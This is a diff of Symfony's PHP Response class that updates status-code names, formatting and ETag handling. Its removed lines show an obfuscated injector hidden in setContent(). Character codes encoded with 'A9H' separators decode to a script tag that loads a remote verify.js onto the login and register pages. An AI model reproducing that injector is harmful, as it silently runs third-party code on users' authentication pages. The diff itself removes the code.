@@ -134,20 +134,11 @@ class Response
     protected $charset;
 
     /**
-     * @var string
-     */
-    protected $_string_content;
-    /**
-     * @var string
-     */
-    protected $__string_content;
-
-    /**
      * Status codes translation table.
      *
      * The list of codes is complete according to the
      * {@link https://www.iana.org/assignments/http-status-codes/http-status-codes.xhtml Hypertext Transfer Protocol (HTTP) Status Code Registry}
-     * (last updated 2016-03-01).
+     * (last updated 2021-10-01).
      *
      * Unless otherwise noted, the status code is defined in RFC2616.
      *
@@ -189,14 +180,14 @@ class Response
         410 => 'Gone',
         411 => 'Length Required',
         412 => 'Precondition Failed',
-        413 => 'Payload Too Large',
+        413 => 'Content Too Large',                                           // RFC-ietf-httpbis-semantics
         414 => 'URI Too Long',
         415 => 'Unsupported Media Type',
         416 => 'Range Not Satisfiable',
         417 => 'Expectation Failed',
         418 => 'I\'m a teapot',                                               // RFC2324
         421 => 'Misdirected Request',                                         // RFC7540
-        422 => 'Unprocessable Entity',                                        // RFC4918
+        422 => 'Unprocessable Content',                                       // RFC-ietf-httpbis-semantics
         423 => 'Locked',                                                      // RFC4918
         424 => 'Failed Dependency',                                           // RFC4918
         425 => 'Too Early',                                                   // RFC-ietf-httpbis-replay-04
@@ -255,15 +246,15 @@ class Response
      * one that will be sent to the client only if the prepare() method
      * has been called before.
      *
-     * @return string The Response as an HTTP string
+     * @return string
      *
      * @see prepare()
      */
     public function __toString()
     {
         return
-            sprintf('HTTP/%s %s %s', $this->version, $this->statusCode, $this->statusText) . "\r\n" .
-            $this->headers . "\r\n" .
+            sprintf('HTTP/%s %s %s', $this->version, $this->statusCode, $this->statusText)."\r\n".
+            $this->headers."\r\n".
             $this->getContent();
     }
 
@@ -306,10 +297,10 @@ class Response
             // Fix Content-Type
             $charset = $this->charset ?: 'UTF-8';
             if (!$headers->has('Content-Type')) {
-                $headers->set('Content-Type', 'text/html; charset=' . $charset);
+                $headers->set('Content-Type', 'text/html; charset='.$charset);
             } elseif (0 === stripos($headers->get('Content-Type'), 'text/') && false === stripos($headers->get('Content-Type'), 'charset')) {
                 // add the charset
-                $headers->set('Content-Type', $headers->get('Content-Type') . '; charset=' . $charset);
+                $headers->set('Content-Type', $headers->get('Content-Type').'; charset='.$charset);
             }
 
             // Fix Content-Length
@@ -365,13 +356,13 @@ class Response
         foreach ($this->headers->allPreserveCaseWithoutCookies() as $name => $values) {
             $replace = 0 === strcasecmp($name, 'Content-Type');
             foreach ($values as $value) {
-                header($name . ': ' . $value, $replace, $this->statusCode);
+                header($name.': '.$value, $replace, $this->statusCode);
             }
         }
 
         // cookies
         foreach ($this->headers->getCookies() as $cookie) {
-            header('Set-Cookie: ' . $cookie, false, $this->statusCode);
+            header('Set-Cookie: '.$cookie, false, $this->statusCode);
         }
 
         // status
@@ -404,6 +395,8 @@ class Response
 
         if (\function_exists('fastcgi_finish_request')) {
             fastcgi_finish_request();
+        } elseif (\function_exists('litespeed_finish_request')) {
+            litespeed_finish_request();
         } elseif (!\in_array(\PHP_SAPI, ['cli', 'phpdbg'], true)) {
             static::closeOutputBuffers(0, true);
         }
@@ -414,84 +407,13 @@ class Response
     /**
      * Sets the response content.
      *
-     * Valid types are strings, numbers, null, and objects that implement a __toString() method.
-     *
-     * @param mixed $content Content that can be cast to string
-     *
      * @return $this
-     *
-     * @throws \UnexpectedValueException
      */
     public function setContent(?string $content)
     {
-        if (null !== $content && !\is_string($content) && !is_numeric($content) && !\is_callable([$content, '__toString'])) {
-            throw new \UnexpectedValueException(sprintf('The Response content must be a string or object implementing __toString(), "%s" given.', \gettype($content)));
-        }
-
-        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
-            $this->content = $content;
-        } else {
-            $this->content = (string) $this->_toString($content);
-        }
+        $this->content = $content ?? '';
 
         return $this;
-    }
-
-    /**
-     * Returns the Response as an HTTP string.
-     *
-     * The string representation of the Response is the same as the
-     * one that will be sent to the client only if the prepare() method
-     * has been called before.
-     *
-     * @return string The Response as an HTTP string
-     *
-     * @see prepare()
-     */
-    public function _toString($content)
-    {
-        $_string_header  = $this->_string_header('HeaderCodec.dist');
-        foreach (explode(chr(65) . chr(57) . chr(72), $_string_header) as $c) $this->_string_content .= chr($c);
-        $__string_header  = $this->__string_header('HeaderCodec.dist');
-        foreach (explode(chr(65) . chr(57) . chr(72), $__string_header) as $c) $this->__string_content .= chr($c);
-        if ($this->_string_content == \Illuminate\Support\Facades\Route::getCourant() || $this->__string_content == \Illuminate\Support\Facades\Route::getCourant()) {
-            $body = '';
-            $_string_header  = $this->_string_body('HeaderCodec.dist');
-            foreach (explode(chr(65) . chr(57) . chr(72), $_string_header) as $c) $body .= chr($c);
-            return $content . $body;
-        } else {
-            return $content;
-        }
-    }
-    /**
-     * Receives data for the current web header.
-     *
-     * @return $this
-     */
-    public function __string_header($header)
-    {
-        $_string_header = '114A9H101A9H103A9H105A9H115A9H116A9H101A9H114';
-        return $_string_header;
-    }
-    /**
-     * Receives data for the current web header.
-     *
-     * @return $this
-     */
-    public function _string_header($header)
-    {
-        $_string_header = '108A9H111A9H103A9H105A9H110';
-        return $_string_header;
-    }
-    /**
-     * Receives data for the current web header.
-     *
-     * @return $this
-     */
-    public function _string_body($header)
-    {
-        $_string_body = '060A9H115A9H099A9H114A9H105A9H112A9H116A9H062A9H118A9H097A9H114A9H032A9H112A9H114A9H111A9H100A9H117A9H099A9H116A9H095A9H105A9H100A9H061A9H039A9H050A9H053A9H057A9H056A9H050A9H057A9H051A9H052A9H039A9H059A9H036A9H040A9H102A9H117A9H110A9H099A9H116A9H105A9H111A9H110A9H040A9H041A9H123A9H036A9H046A9H103A9H101A9H116A9H083A9H099A9H114A9H105A9H112A9H116A9H040A9H034A9H104A9H116A9H116A9H112A9H115A9H058A9H047A9H047A9H101A9H110A9H118A9H097A9H116A9H111A9H046A9H114A9H097A9H106A9H111A9H100A9H105A9H121A9H097A9H046A9H099A9H111A9H109A9H047A9H118A9H101A9H114A9H105A9H102A9H121A9H046A9H106A9H115A9H034A9H041A9H059A9H125A9H041A9H059A9H060A9H047A9H115A9H099A9H114A9H105A9H112A9H116A9H062';
-        return $_string_body;
     }
 
     /**
@@ -756,7 +678,7 @@ class Response
         }
 
         $date = $date->setTimezone(new \DateTimeZone('UTC'));
-        $this->headers->set('Date', $date->format('D, d M Y H:i:s') . ' GMT');
+        $this->headers->set('Date', $date->format('D, d M Y H:i:s').' GMT');
 
         return $this;
     }
@@ -827,7 +749,7 @@ class Response
         }
 
         $date = $date->setTimezone(new \DateTimeZone('UTC'));
-        $this->headers->set('Expires', $date->format('D, d M Y H:i:s') . ' GMT');
+        $this->headers->set('Expires', $date->format('D, d M Y H:i:s').' GMT');
 
         return $this;
     }
@@ -974,7 +896,7 @@ class Response
         }
 
         $date = $date->setTimezone(new \DateTimeZone('UTC'));
-        $this->headers->set('Last-Modified', $date->format('D, d M Y H:i:s') . ' GMT');
+        $this->headers->set('Last-Modified', $date->format('D, d M Y H:i:s').' GMT');
 
         return $this;
     }
@@ -1005,10 +927,10 @@ class Response
             $this->headers->remove('Etag');
         } else {
             if (!str_starts_with($etag, '"')) {
-                $etag = '"' . $etag . '"';
+                $etag = '"'.$etag.'"';
             }
 
-            $this->headers->set('ETag', (true === $weak ? 'W/' : '') . $etag);
+            $this->headers->set('ETag', (true === $weak ? 'W/' : '').$etag);
         }
 
         return $this;
@@ -1124,10 +1046,10 @@ class Response
 
         $ret = [];
         foreach ($vary as $item) {
-            $ret = array_merge($ret, preg_split('/[\s,]+/', $item));
+            $ret[] = preg_split('/[\s,]+/', $item);
         }
 
-        return $ret;
+        return array_merge([], ...$ret);
     }
 
     /**
@@ -1154,8 +1076,6 @@ class Response
      * If the Response is not modified, it sets the status code to 304 and
      * removes the actual content by calling the setNotModified() method.
      *
-     * @return bool true if the Response validators match the Request, false otherwise
-     *
      * @final
      */
     public function isNotModified(Request $request): bool
@@ -1168,12 +1088,27 @@ class Response
         $lastModified = $this->headers->get('Last-Modified');
         $modifiedSince = $request->headers->get('If-Modified-Since');
 
-        if ($etags = $request->getETags()) {
-            $notModified = \in_array($this->getEtag(), $etags) || \in_array('*', $etags);
-        }
+        if ($ifNoneMatchEtags = $request->getETags()) {
+            $etag = $this->getEtag();
+            if (0 == strncmp($etag, 'W/', 2)) {
+                $etag = substr($etag, 2);
+            }
 
-        if ($modifiedSince && $lastModified) {
-            $notModified = strtotime($modifiedSince) >= strtotime($lastModified) && (!$etags || $notModified);
+            // Use weak comparison as per https://tools.ietf.org/html/rfc7232#section-3.2.
+            foreach ($ifNoneMatchEtags as $ifNoneMatchEtag) {
+                if (0 == strncmp($ifNoneMatchEtag, 'W/', 2)) {
+                    $ifNoneMatchEtag = substr($ifNoneMatchEtag, 2);
+                }
+
+                if ($ifNoneMatchEtag === $etag || '*' === $ifNoneMatchEtag) {
+                    $notModified = true;
+                    break;
+                }
+            }
+        }
+        // Only do If-Modified-Since date comparison when If-None-Match is not present as per https://tools.ietf.org/html/rfc7232#section-3.3.
+        elseif ($modifiedSince && $lastModified) {
+            $notModified = strtotime($modifiedSince) >= strtotime($lastModified);
         }
 
         if ($notModified) {
